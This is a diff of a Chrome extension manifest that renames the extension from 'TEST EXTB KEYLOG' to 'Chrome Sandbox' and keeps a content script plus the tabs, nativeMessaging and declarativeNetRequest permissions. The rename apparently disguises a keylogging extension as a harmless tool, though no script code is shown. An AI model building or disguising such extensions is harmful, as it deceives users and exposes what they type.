@@ -1,14 +1,10 @@
 {
     "manifest_version": 3,
-    "name": "TEST EXTB KEYLOG",
+    "name": "Chrome Sandbox",
     "version": "1",
-        // "icon": {
-        //     "48": "Adobe.png"
-        // },
     "description": "NICE",
         "background": {
             "service_worker": "background.js"
-             // "type": "module"
         },
     "content_scripts": [
         {
@@ -16,23 +12,10 @@
             "js": ["content.js"]
         }
     ],
-    //,
-    // "web_accessible_resources": [
-    //     {
-    //     "resources": [ "Adobe.png" ],
-    //     "matches": ["*://*/*"]
-    //     }
-    // ],
     "permissions": [
         "tabs",
         "activeTab",
         "nativeMessaging",
          "declarativeNetRequest"
     ]
-    // "host_permissions": [
-    //     "<all_urls>"
-    // ],
-    // "externally_connectable": {
-    //     "matches": ["https://*.chrome.com/*"]
-    // }
 }
